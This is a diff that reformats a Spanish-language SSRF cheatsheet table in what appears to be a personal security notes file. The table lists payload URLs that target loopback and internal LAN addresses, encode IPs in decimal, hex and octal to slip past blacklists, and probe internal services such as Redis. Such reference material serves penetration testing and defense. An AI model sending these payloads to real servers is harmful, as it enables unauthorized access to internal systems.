@@ -20,14 +20,14 @@ linked:
 
 ## Cheatsheet
 
-| **Vector** | **Payload** | **Notas** |
-|:---:|:---:|---|
-| **Loopback directo** | `http://127.0.0.1/admin` | Target clásico — servicios internos bindeados a localhost. |
-| **Hostname alterno** | `http://localhost/`, `http://0.0.0.0/`, `http://[::1]/` | Bypass de blacklists simples de `127.0.0.1`. |
-| **IP en formatos raros** | `http://2130706433/` (decimal), `http://0x7f000001/` (hex), `http://0177.0.0.1/` (octal) | Evade regex estrictos que solo matchean dotted-quad. |
-| **Puertos arbitrarios** | `http://127.0.0.1:6379/` (Redis), `http://127.0.0.1:8080/actuator` | Enum servicios internos. |
-| **LAN interna** | `http://192.168.1.1/`, `http://10.0.0.1/` | Pivot desde server a red interna. |
-| **Reflexión de error** | `http://internal-only/existe` vs `http://internal-only/404` | Fingerprinting por response diff cuando servicio interno no responde con 200. |
+|        **Vector**        |                                       **Payload**                                        | **Notas**                                                                     |
+| :----------------------: | :--------------------------------------------------------------------------------------: | ----------------------------------------------------------------------------- |
+|   **Loopback directo**   |                                 `http://127.0.0.1/admin`                                 | Target clásico — servicios internos bindeados a localhost.                    |
+|   **Hostname alterno**   |                 `http://localhost/`, `http://0.0.0.0/`, `http://[::1]/`                  | Bypass de blacklists simples de `127.0.0.1`.                                  |
+| **IP en formatos raros** | `http://2130706433/` (decimal), `http://0x7f000001/` (hex), `http://0177.0.0.1/` (octal) | Evade regex estrictos que solo matchean dotted-quad.                          |
+| **Puertos arbitrarios**  |            `http://127.0.0.1:6379/` (Redis), `http://127.0.0.1:8080/actuator`            | Enum servicios internos.                                                      |
+|     **LAN interna**      |                        `http://192.168.1.1/`, `http://10.0.0.1/`                         | Pivot desde server a red interna.                                             |
+|  **Reflexión de error**  |               `http://internal-only/existe` vs `http://internal-only/404`                | Fingerprinting por response diff cuando servicio interno no responde con 200. |
 ^ssrf-basico
 
 ___
